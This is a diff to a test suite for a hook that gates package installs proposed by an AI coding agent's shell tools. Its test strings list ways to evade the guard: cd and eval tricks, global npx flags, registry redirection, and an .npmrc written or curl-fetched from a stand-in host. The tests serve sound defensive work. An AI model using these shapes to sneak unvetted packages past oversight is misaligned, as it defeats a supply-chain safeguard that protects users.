@@ -819,12 +819,19 @@ describe('shell-running MCP tools (F07), built hook, subprocess', () => {
 // A decision is "gated" when permissionDecision is ask or deny. "Allowed" is no permissionDecision.
 // ---------------------------------------------------------------------------
 describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
-  type Stub = { ageHours?: number; nextHours?: number };
+  type Stub = { ageHours?: number; nextHours?: number; osvMal?: boolean };
 
   async function runHook(
     command: string,
-    opts: { tool?: string; stub?: Stub; cwd?: string } = {},
+    opts: { tool?: string; stub?: Stub; cwd?: string; env?: Record<string, string> } = {},
   ): Promise<string | undefined> {
+    return (await runHookFull(command, opts)).decision;
+  }
+
+  async function runHookFull(
+    command: string,
+    opts: { tool?: string; stub?: Stub; cwd?: string; env?: Record<string, string> } = {},
+  ): Promise<{ decision: string | undefined; reason: string }> {
     const { spawnSync } = await import('node:child_process');
     const { existsSync, mkdtempSync } = await import('node:fs');
     const { tmpdir } = await import('node:os');
@@ -839,13 +846,16 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       CCV3_GUARD_DECISIONS_LOG: join(mkdtempSync(join(tmpdir(), 'pig-f08-')), 'guard-decisions.jsonl'),
       PIG_STUB_AGE_HOURS: String(opts.stub?.ageHours ?? 2400),
       PIG_STUB_NEXT_HOURS: String(opts.stub?.nextHours ?? 2400),
+      PIG_STUB_OSV_MAL: opts.stub?.osvMal ? '1' : '',
     };
+    delete env.CDPATH;
+    Object.assign(env, opts.env);
     delete env.VITEST;
     delete env.VITEST_WORKER_ID;
     const payload = {
       session_id: 'test-session',
       tool_name: opts.tool ?? 'Bash',
-      tool_input: { command },
+      tool_input: (opts.tool ?? '').endsWith('__interact_with_process') ? { input: command } : { command },
       ...(opts.cwd ? { cwd: opts.cwd } : {}),
     };
     const res = spawnSync(process.execPath, ['-r', netStub, dist], {
@@ -857,7 +867,10 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
     });
     expect(res.status).toBe(0);
     const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
-    return out.hookSpecificOutput?.permissionDecision;
+    return {
+      decision: out.hookSpecificOutput?.permissionDecision,
+      reason: String(out.hookSpecificOutput?.permissionDecisionReason ?? ''),
+    };
   }
 
   const FRESH: Stub = { ageHours: 1 }; // the package was published an hour ago: a detected install is denied
@@ -1293,7 +1306,6 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       'npm x -- zz-local-bin-a1 run',
       'bunx zz-local-bin-a1',
       'bun x zz-local-bin-a1',
-      'npx zz-local-bin-b2',
     ])('local bin present: %j allows', async (cmd) => {
       expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBeUndefined();
     });
@@ -1322,8 +1334,265 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
     it('PowerShell: local bin present: npx zz-local-bin-a1 run allows', async () => {
       expect(await runHook('npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: await binFixture(BINS) })).toBeUndefined();
     });
+    it('changed (round 3 HIGH 1): only zz-local-bin-b2.cmd exists, so npx zz-local-bin-b2 denies', async () => {
+      expect(await runHook('npx zz-local-bin-b2', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+    });
+    it.each([
+      'npx -g zz-local-bin-a1 run',
+      'npx --global zz-local-bin-a1 run',
+      'npx --location=global zz-local-bin-a1 run',
+      'npm_config_global=true npx zz-local-bin-a1 run',
+      'NPM_CONFIG_LOCATION=global npx zz-local-bin-a1 run',
+    ])('round 5 HIGH: global mode ignores the local bin, so %j denies', async (cmd) => {
+      expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+    });
+    it('round 5 HIGH: a trailing @ fetches name@*, so npx zz-local-bin-a1@ run denies', async () => {
+      expect(await runHook('npx zz-local-bin-a1@ run', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+    });
+    it('round 5 HIGH: a line continuation inside cd (c\\<newline>d) still makes the folder unknown', async () => {
+      expect(await runHook('c\\\nd "' + (await emptyDir()) + '"; npx zz-local-bin-a1 run', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+    });
     it('regression: local bin absent: npx zz-local-bin-a1 run still denies', async () => {
       expect(await runHook('npx zz-local-bin-a1 run', { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+    });
+
+    // ----- G6a: the guard follows no cd (round 4 dropped rule 1). Any cd makes the folder unknown: every check runs. -----
+    describe('G6a: a cd makes the local-bin folder unknown', () => {
+      // Changed (round 4, rule 1 dropped): a cd to a folder with the bin no longer skips the checks.
+      it.each([
+        ['Bash', (d: string) => `cd "${d}"; npx zz-local-bin-a1 run`],
+        ['Bash', (d: string) => `cd '${d}' && npx zz-local-bin-a1 run`],
+        ['Bash', (d: string) => `pushd "${d}" && npx zz-local-bin-a1 run`],
+        ['PowerShell', (d: string) => `Set-Location "${d}"; npx zz-local-bin-a1 run`],
+        ['PowerShell', (d: string) => `Set-Location -Path "${d}"; npx zz-local-bin-a1 run`],
+        ['PowerShell', (d: string) => `Push-Location "${d}"; npx zz-local-bin-a1 run`],
+        ['Bash', (d: string) => `cd "${d}"\nnpx zz-local-bin-a1 run`],
+      ])('%s: cd to a folder with the bin is not followed, so the checks run and deny (#%#)', async (tool, make) => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(make(fixture), { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('changed (round 4): a relative cd target is not followed either', async () => {
+        const { basename } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd ../${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.each(['@zz', '@args', '$zz'])('round 4 HIGH: PowerShell Set-Location %s (splatting, not a folder) is not followed', async (arg) => {
+        const { mkdirSync, writeFileSync } = await import('node:fs');
+        const { join } = await import('node:path');
+        const cwd = await emptyDir();
+        mkdirSync(join(cwd, arg, 'node_modules', '.bin'), { recursive: true });
+        writeFileSync(join(cwd, arg, 'node_modules', '.bin', 'zz-local-bin-a1'), '');
+        expect(await runHook(`Set-Location ${arg}; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd })).toBe('deny');
+      });
+      it('fail closed: two cd segments chain (cd A && cd B && npx) is not followed', async () => {
+        const { dirname, basename } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd "${dirname(fixture)}" && cd ./${basename(fixture)} && npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+
+      // ----- Verify rounds 1-2: shapes the old cd-follow code misread. Each must deny (no local-bin skip). -----
+      // "to": the cd target has the bin, the payload cwd has none. "away": the reverse.
+      it.each([
+        ['env cd', (d: string) => `env cd "${d}"; npx zz-local-bin-a1 run`],
+        ['sudo cd', (d: string) => `sudo cd "${d}"; npx zz-local-bin-a1 run`],
+        ['nohup cd', (d: string) => `nohup cd "${d}"; npx zz-local-bin-a1 run`],
+        ['if body', (d: string) => `if false; then\ncd "${d}"\nfi\nnpx zz-local-bin-a1 run`],
+        ['while body', (d: string) => `while false; do\ncd "${d}"\ndone\nnpx zz-local-bin-a1 run`],
+        ['function body', (d: string) => `f() {\ncd "${d}"\n}\nnpx zz-local-bin-a1 run`],
+        ['cd, rm node_modules, npx', (d: string) => `cd "${d}"; rm -rf node_modules; npx zz-local-bin-a1 run`],
+        ['cd, rm node_modules && npx', (d: string) => `cd "${d}" && rm -rf node_modules && npx zz-local-bin-a1 run`],
+      ])('bypass (to): %s is not followed', async (_name, make) => {
+        expect(await runHook(make(await binFixture(BINS)), { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.each([
+        ['subshell', (d: string) => `(cd "${d}"; npx zz-local-bin-a1 run)`],
+        ['quoted c\'\'d', (d: string) => `c''d "${d}"; npx zz-local-bin-a1 run`],
+        ['escaped c\\d', (d: string) => `c\\d "${d}"; npx zz-local-bin-a1 run`],
+        ['quoted "cd"', (d: string) => `"cd" "${d}"; npx zz-local-bin-a1 run`],
+        ['variable command word', (d: string) => `X=c; \${X}d "${d}"; npx zz-local-bin-a1 run`],
+        ['source', () => 'source ./zz-env.sh; npx zz-local-bin-a1 run'],
+        ['eval', () => 'eval "$ZZ"; npx zz-local-bin-a1 run'],
+      ])('bypass (away): %s may move the folder, so the payload cwd is not trusted', async (_name, make) => {
+        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it.each(['cd /tmp', 'cd /', 'cd //zz-host/zz-share'])('fail closed: Bash %j (a leading / other than a /c/ drive mount) is not followed', async (cd) => {
+        const { basename } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`${cd}/${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+        expect(await runHook(`${cd}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: fixture })).toBe('deny');
+      });
+      it('fail closed: a bare relative cd target (CDPATH may apply) is not followed', async () => {
+        const { basename, dirname } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd ${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: dirname(fixture) })).toBe('deny');
+      });
+      it('changed (round 4): cd ./dir is not followed, with or without CDPATH', async () => {
+        const { basename, dirname } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        const cmd = `cd ./${basename(fixture)}; npx zz-local-bin-a1 run`;
+        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(fixture) })).toBe('deny');
+        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(fixture), env: { CDPATH: await emptyDir() } })).toBe('deny');
+      });
+      it('bypass: cd AWAY from the folder that has the bin: npx fetches, so it denies', async () => {
+        const away = await emptyDir();
+        expect(await runHook(`cd "${away}"; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it.each([
+        'cd $TARGET; npx zz-local-bin-a1 run',
+        'cd ~/zz-proj; npx zz-local-bin-a1 run',
+        'cd /zz-missing-a1-dir; npx zz-local-bin-a1 run',
+        'cd -; npx zz-local-bin-a1 run',
+        'cd; npx zz-local-bin-a1 run',
+        'cd zz-*; npx zz-local-bin-a1 run',
+      ])('fail closed: %j has no resolvable folder, so no local-bin skip (payload cwd has the bin)', async (cmd) => {
+        expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it.each([
+        (d: string) => `cd "${d}" || npx zz-local-bin-a1 run`,
+        (d: string) => `cd "${d}" | npx zz-local-bin-a1 run`,
+        (d: string) => `cd "${d}" & npx zz-local-bin-a1 run`,
+        (d: string) => `false && cd "${d}"; npx zz-local-bin-a1 run`,
+        (d: string) => `(cd "${d}"); npx zz-local-bin-a1 run`,
+        (d: string) => `cd "${d}"; popd; npx zz-local-bin-a1 run`,
+      ])('fail closed: a cd that may not run, or runs in a subshell, is not followed (#%#)', async (make) => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(make(fixture), { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('a later cd to an unresolved folder cancels an earlier good one', async () => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd "${fixture}"; cd $ELSEWHERE; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('a command substitution after a cd does not inherit the folder (fail closed)', async () => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd "${fixture}"; echo $(npx zz-local-bin-a1 run)`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('bypass: a cd inside a shell comment never runs, so it is not followed', async () => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`echo x # ; cd "${fixture}"\nnpx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.each(['Set-Location', 'sl', 'chdir', 'CD', 'Push-Location', 'PUSHD'])('bypass: %s is not a Bash cd, so Bash does not follow it', async (word) => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`${word} "${fixture}"; npx zz-local-bin-a1 run`, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.each(['cd', 'CD', 'chdir', 'sl', 'Set-Location', 'pushd'])('changed (round 4): PowerShell does not follow %s', async (word) => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`${word} "${fixture}"; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('desktop-commander reads the text in both dialects: a Bash-only miss still denies', async () => {
+        const fixture = await binFixture(BINS);
+        const tool = 'mcp__plugin_desktop-commander_desktop-commander__start_process';
+        expect(await runHook(`Set-Location "${fixture}"; npx zz-local-bin-a1 run`, { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('bypass: the desktop-commander shell keeps its own folder, not the session cwd', async () => {
+        const tool = 'mcp__plugin_desktop-commander_desktop-commander__interact_with_process';
+        expect(await runHook('npx zz-local-bin-a1 run', { tool, stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it.each([
+        'cd //10.255.255.1/zzshare; npm install zz-fake-pkg-a1',
+        'cd "\\\\10.255.255.1\\zzshare"; npm install zz-fake-pkg-a1',
+        'cd //10.255.255.1/zzshare && npm ci',
+      ])('a UNC target is never opened by the hook: %j is gated fast', async (cmd) => {
+        const t0 = Date.now();
+        gated(await runHook(cmd, { stub: FRESH, cwd: await emptyDir() }));
+        expect(Date.now() - t0).toBeLessThan(8000);
+      }, 25_000);
+      it('a UNC Set-Location target in PowerShell is never opened either', async () => {
+        const t0 = Date.now();
+        gated(await runHook("Set-Location '\\\\10.255.255.1\\zzshare'; npm install zz-fake-pkg-a1", { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() }));
+        expect(Date.now() - t0).toBeLessThan(8000);
+      }, 25_000);
+      it.each([
+        (d: string) => `if true; then cd "${d}"; fi; npx zz-local-bin-a1 run`,
+        (d: string) => `true && { cd "${d}"; }; npx zz-local-bin-a1 run`,
+        (d: string) => `eval "cd ${d}"; npx zz-local-bin-a1 run`,
+        (d: string) => `for i in 1; do cd "${d}"; done; npx zz-local-bin-a1 run`,
+      ])('bypass: a cd that is not the first word of its segment makes the folder unknown (#%#)', async (make) => {
+        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it('bypass: PowerShell cd.. (no space) makes the folder unknown', async () => {
+        expect(await runHook('cd..; npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: await binFixture(BINS, true) })).toBe('deny');
+      });
+      it.each([
+        (d: string) => `env -C "${d}" npx zz-local-bin-a1 run`,
+        (d: string) => `npx --prefix "${d}" zz-local-bin-a1 run`,
+        (d: string) => `npm --prefix "${d}" exec zz-local-bin-a1`,
+        (d: string) => `env --chdir="${d}" npx zz-local-bin-a1 run`,
+      ])('bypass: an option that moves the folder of the runner skips no check (#%#)', async (make) => {
+        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
+      });
+      it('bypass: Bash reads an unquoted backslash as an escape, so cd ..\\dir fails and is not followed', async () => {
+        const { basename } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        const cmd = `cd ..\\${basename(fixture)}; npx zz-local-bin-a1 run`;
+        expect(await runHook(cmd, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('changed (round 4): PowerShell does not follow cd ..\\dir', async () => {
+        const { basename } = await import('node:path');
+        const fixture = await binFixture(BINS);
+        const cmd = `cd ..\\${basename(fixture)}; npx zz-local-bin-a1 run`;
+        expect(await runHook(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.each(['Bash', 'PowerShell'])('%s: cd /d is a cmd.exe form, not a cd to the folder', async (tool) => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook(`cd /d "${fixture}"; npx zz-local-bin-a1 run`, { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it.runIf(process.platform === 'win32')('changed (round 4): neither PowerShell nor Bash follows cd /c/... (MSYS path)', async () => {
+        const fixture = await binFixture(BINS);
+        const msys = fixture.replace(/^([A-Za-z]):/, (_m, d: string) => `/${d.toLowerCase()}`).replace(/\\/g, '/');
+        expect(await runHook(`cd ${msys}; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+        expect(await runHook(`cd ${msys}; npx zz-local-bin-a1 run`, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
+      });
+      it('bypass: CDPATH in the command can send cd elsewhere, so a relative cd is not followed', async () => {
+        const { mkdirSync } = await import('node:fs');
+        const { basename, dirname, join } = await import('node:path');
+        const deeper = await binFixture(BINS, true); // <root>/zz-sub/zz-deeper, the bin is in <root>
+        const elsewhere = await emptyDir();
+        mkdirSync(join(elsewhere, basename(deeper)));
+        const cmd = `export CDPATH="${elsewhere}"; cd ${basename(deeper)}; npx zz-local-bin-a1 run`;
+        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(deeper) })).toBe('deny');
+      });
+      it('changed (round 4): npm ci after a cd is gated, even when the cd target has the lockfile', async () => {
+        const { mkdtempSync, writeFileSync } = await import('node:fs');
+        const { tmpdir } = await import('node:os');
+        const { join } = await import('node:path');
+        const withLock = mkdtempSync(join(tmpdir(), 'pig-lock-'));
+        writeFileSync(join(withLock, 'package-lock.json'), '{}');
+        gated(await runHook(`cd "${await emptyDir()}"; npm ci`, { stub: FRESH, cwd: withLock }));
+        gated(await runHook(`cd "${withLock}"; npm ci`, { stub: FRESH, cwd: await emptyDir() }));
+      });
+    });
+
+    // ----- G6b: the local bin skips OSV; an OSV hit with no version must say the version is unknown -----
+    describe('G6b: OSV and the local bin, OSV with no version', () => {
+      const MAL: Stub = { ageHours: 2400, osvMal: true };
+      it('local bin in the payload cwd: OSV is skipped, so a MAL advisory does not stop the run', async () => {
+        expect(await runHook('npx zz-local-bin-a1 run', { stub: MAL, cwd: await binFixture(BINS) })).toBeUndefined();
+      });
+      it('changed (round 4): a cd to the bin folder is not followed: OSV runs, and the deny says the version is unknown', async () => {
+        const fixture = await binFixture(BINS);
+        const r = await runHookFull(`cd "${fixture}"; npx zz-local-bin-a1 run`, { stub: MAL, cwd: await emptyDir() });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
+      });
+      it('no local bin and no version: the OSV deny says the version is unknown', async () => {
+        const r = await runHookFull('npx zz-fake-pkg-a1', { stub: MAL, cwd: await emptyDir() });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
+      });
+      it.each(['npm install zz-fake-pkg-a1@latest', 'npm install zz-fake-pkg-a1@next', 'npm install zz-fake-pkg-a1@^1.0.0'])('a tag or range is not a known version: %j says the version is unknown', async (cmd) => {
+        const r = await runHookFull(cmd, { stub: MAL, cwd: await emptyDir() });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
+      });
+      it('a pinned version: the OSV deny names the advisory with no unknown-version note', async () => {
+        const r = await runHookFull('npm install zz-fake-pkg-a1@1.0.0', { stub: MAL, cwd: await emptyDir() });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).not.toMatch(/unknown/i);
+      });
     });
     it.each([
       'npx zz-local-bin-a1@1.0.0',
@@ -1366,6 +1635,398 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       'npm -w ws install zz-fake-pkg-a1',
     ])('regression: %j still gates (fresh)', async (cmd) => {
       gated(await runHook(cmd, { stub: FRESH }));
+    });
+  });
+
+  // ----- G1-G4: follow-ups from the 2026-11-04 handoff (package-guard-followups) -----
+  const REG = 'https://zz-fake-host.example';
+  const pkgNames = (cmd: string) => extractPackageNames(cmd).map((p) => p.name);
+
+  describe('G1: uv global options before the verb', () => {
+    it.each([
+      'uv --directory /zz run --with zz-fake-pkg-a1 python x.py',
+      'uv --directory=/zz run --with zz-fake-pkg-a1 python x.py',
+      'uv --project /zz --quiet run --with zz-fake-pkg-a1 python x.py',
+      'uv --directory /zz tool run zz-fake-pkg-a1',
+      'uv --directory /zz tool install zz-fake-pkg-a1',
+      'uv --directory /zz add zz-fake-pkg-a1',
+    ])('%j is read like the plain uv form', (cmd) => {
+      expect(pkgNames(cmd)).toEqual(['zz-fake-pkg-a1']);
+      expect(installSegments(cmd)).toHaveLength(1);
+    });
+    it('uv --project X pip install keeps the pip pin rule', () => {
+      expect(unpinnedPipPackages('uv --project /zz pip install zz-fake-pkg-a1')).toEqual(['zz-fake-pkg-a1']);
+      expect(unpinnedPipPackages('uv --project /zz pip install zz-fake-pkg-a1==1.0.0')).toEqual([]);
+    });
+    it('a fresh package behind uv --directory is denied by the built hook', async () => {
+      expect(await runHook('uv --directory /zz run --with zz-fake-pkg-a1 python x.py', { stub: FRESH })).toBe('deny');
+      expect(await runHook('uv --project /zz pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
+    });
+    it('regression: uv run with no package, with global options, allows', async () => {
+      expect(await runHook('uv --directory /zz run pytest -q', { stub: FRESH })).toBeUndefined();
+      expect(await runHook('uv --project /zz pip list', { stub: FRESH })).toBeUndefined();
+    });
+    it('40 repeated global options do not stall the matcher', async () => {
+      const cmd = `uv ${Array(40).fill('--directory').join(' ')} x; npm install zz-fake-pkg-a1`;
+      gated(await runHook(cmd, { stub: FRESH }));
+    }, 8000);
+  });
+
+  describe('G2: a registry change chained with a bare install', () => {
+    it.each([
+      `npm config set registry ${REG} && npm install`,
+      `npm set registry ${REG} && npm install`,
+      `npm config set registry ${REG}; npm ci`,
+      `pnpm config set registry ${REG} && pnpm install`,
+      `export npm_config_registry=${REG}; npm install`,
+    ])('installSegments keeps the bare install when the command sets a registry: %j', (cmd) => {
+      expect(installSegments(cmd)).toHaveLength(1);
+    });
+    it.each([
+      `npm config set registry ${REG} && npm install`,
+      `npm set registry ${REG} && npm install`,
+      `pnpm config set registry ${REG} && pnpm install`,
+      `export npm_config_registry=${REG}; npm install`,
+    ])('Bash: the built hook gates %j', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD }));
+    });
+    it.each([
+      `yarn config set registry ${REG} && yarn install`,
+      `yarn config set npmRegistryServer ${REG} && yarn install`,
+      `yarn config set registry ${REG} && yarn`,
+      `npm c set registry ${REG} && npm install`,
+      `npm config set registry ${REG} && yarn install`,
+      `echo registry=${REG} > .npmrc && npm install`,
+      `printf 'registry=${REG}' >> .npmrc; npm ci`,
+    ])('Bash: the built hook gates %j (yarn, the c alias, an rc file write)', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD }));
+    });
+    it.each([
+      `npm config set registry ${REG}`,
+      `npm set registry ${REG}`,
+      `yarn config set npmRegistryServer ${REG}`,
+      `echo registry=${REG} > .npmrc`,
+      `npm config set -g registry ${REG}`,
+    ])('a registry change on its own persists for later installs, so %j is gated', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD }));
+    });
+    it.each([
+      `npm config set -g registry ${REG} && npm i`,
+      `npm config set --location project registry ${REG} && npm i`,
+      `npm config set a=b registry=${REG} && npm i`,
+      `npm config set --global registry=${REG} && npm i`,
+      `npm config set @zz:registry=${REG} && npm i`,
+      `pnpm config set --location=project registry ${REG} && pnpm install`,
+      `yarn config set -H npmRegistryServer ${REG} && yarn install`,
+      `yarn config set npmScopes.zz.npmRegistryServer ${REG} && yarn install`,
+    ])('a registry key anywhere after the set verb, with any flags: %j is gated', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD }));
+    });
+    // Changed (round 4 G2 raw rule): quoted text is read too. A registry word in a commit message chained with an install asks (fail closed).
+    it('changed (round 4): a registry key in quoted text chained with an install is gated', async () => {
+      gated(await runHook(`git commit -m "npm config set -g registry ${REG}" && npm install`, { stub: OLD }));
+    });
+    it('regression: a bare yarn install, yarn alone and unrelated writes stay allowed', async () => {
+      for (const cmd of ['yarn install', 'yarn', 'echo hello > notes.txt && npm install', 'yarn config get registry']) {
+        expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
+      }
+    });
+    it('changed (round 4): any package-manager config command chained with an install is gated', async () => {
+      gated(await runHook('yarn config set loglevel warn && yarn install', { stub: OLD }));
+    });
+    it.each([
+      `npm config set reg\\istry ${REG} && npm install zz-fake-pkg-a1@1.0.0`,
+      'K=registry; npm config set $K U && npm i',
+      `curl -so .npmrc ${REG}/rc && npm install zz-fake-pkg-a1@1.0.0`,
+      'ln -sf /tmp/rc .npmrc && npm i',
+      'sed -i s/a/b/ .npmrc && npm i',
+      `node -e "require('fs').writeFileSync('.npmrc','registry=U')" && npm i`,
+      `pip config --user set global.index-url ${REG}/simple && pip install zz-fake-py==1.0.0`,
+      'python -m pip config --site set global.extra-index-url U && pip install zz-fake-py==1.0.0',
+      'npm config set reg""istry U && npm install',
+      "npm config set r'e'gistry U && npm install",
+      'npm config set reg`echo`istry U && npm install',
+      'uv pip install -r requirements.txt && cat uv.toml',
+      'echo $UV_INDEX_URL && pip install zz-fake-py==1.0.0',
+    ])('round 4 G2 raw rule: %j asks with the custom index reason', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD });
+      gated(r.decision); // ask, or deny when the run is unattended (CI, a subagent)
+      expect(r.reason).toMatch(/Custom package index or config/);
+    });
+    it.each(['npm install left-pad@1.3.0', 'git status', 'npm config get cache'])('round 4 G2 regression: %j allows', async (cmd) => {
+      expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
+    });
+    it.each(['cat .npmrc', 'npm config get registry', 'echo registry'])('round 4 G2: a raw mention alone (no install) keeps today\'s allow: %j', async (cmd) => {
+      expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
+    });
+    it('PowerShell: $env:npm_config_registry then a bare install is gated', async () => {
+      gated(await runHook(`$env:npm_config_registry='${REG}'; npm install`, { tool: 'PowerShell', stub: OLD }));
+    });
+    it('already covered: NPM_CONFIG_REGISTRY= prefix on a bare install is gated', async () => {
+      gated(await runHook(`NPM_CONFIG_REGISTRY=${REG} npm install`, { stub: OLD }));
+    });
+    it('regression: a bare install stays allowed', async () => {
+      expect(installSegments('npm install')).toEqual([]);
+      expect(await runHook('npm install', { stub: OLD })).toBeUndefined();
+    });
+    it('changed (round 4): an unrelated config set chained with a bare install is gated (raw rule a)', async () => {
+      expect(installSegments('npm config set loglevel warn && npm install')).toEqual(['npm install']);
+      gated(await runHook('npm config set loglevel warn && npm install', { stub: OLD }));
+    });
+  });
+
+  describe('G3: a variable interpreter before -m pip install', () => {
+    it.each([
+      '$PYTHON -m pip install zz-fake-pkg-a1',
+      '${PY} -m pip install zz-fake-pkg-a1',
+      '"$VENV/bin/python" -m pip install zz-fake-pkg-a1',
+      '$VENV/bin/python -m pip install zz-fake-pkg-a1',
+      '"$PYTHON" -m pip install zz-fake-pkg-a1',
+      '${PY:-python3} -m pip install zz-fake-pkg-a1',
+      '"${PY:-python3}" -m pip install zz-fake-pkg-a1',
+    ])('%j is an unpinned pip install', (cmd) => {
+      expect(unpinnedPipPackages(cmd)).toEqual(['zz-fake-pkg-a1']);
+    });
+    it('a pinned variable-interpreter install names its package and pin', () => {
+      expect(extractPackageNames('${PY} -m pip install zz-fake-pkg-a1==1.0.0')).toEqual([{ name: 'zz-fake-pkg-a1', version: '1.0.0' }]);
+    });
+    it('built hook: an unpinned $PYTHON -m pip install is denied (not just asked)', async () => {
+      expect(await runHook('$PYTHON -m pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
+      expect(await runHook('"$VENV/bin/python" -m pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
+    });
+    it('round 4 low: a parameter expansion interpreter ${PY:-python3} with an unpinned install is denied', async () => {
+      const r = await runHookFull('${PY:-python3} -m pip install zz-fake-pkg-a1', { stub: OLD });
+      expect(r.decision).toBe('deny');
+      expect(r.reason).toMatch(/zz-fake-pkg-a1/);
+      expect(r.reason).not.toMatch(/cannot parse/);
+    });
+    it('built hook: a fresh pinned package behind ${PY} is denied by the age check', async () => {
+      expect(await runHook('${PY} -m pip install zz-fake-pkg-a1==1.0.0', { stub: FRESH })).toBe('deny');
+    });
+    it('PowerShell: & $python -m pip install is unpinned', async () => {
+      expect(await runHook('& $python -m pip install zz-fake-pkg-a1', { tool: 'PowerShell', stub: OLD })).toBe('deny');
+    });
+    it('regression: a variable interpreter running a script or pip list stays allowed', async () => {
+      expect(await runHook('$PYTHON script.py', { stub: FRESH })).toBeUndefined();
+      expect(await runHook('$PYTHON -m pip list', { stub: FRESH })).toBeUndefined();
+      expect(await runHook('$PYTHON -m pytest -q', { stub: FRESH })).toBeUndefined();
+    });
+  });
+
+  describe('G4: cargo binstall, dotnet add package, brew install', () => {
+    it('cargo binstall is a cargo install', () => {
+      expect(parseEcosystem('cargo binstall zz-fake-crate')).toBe('cargo');
+      expect(pkgNames('cargo binstall zz-fake-crate')).toEqual(['zz-fake-crate']);
+    });
+    it('dotnet add package names the package, with or without a project argument', () => {
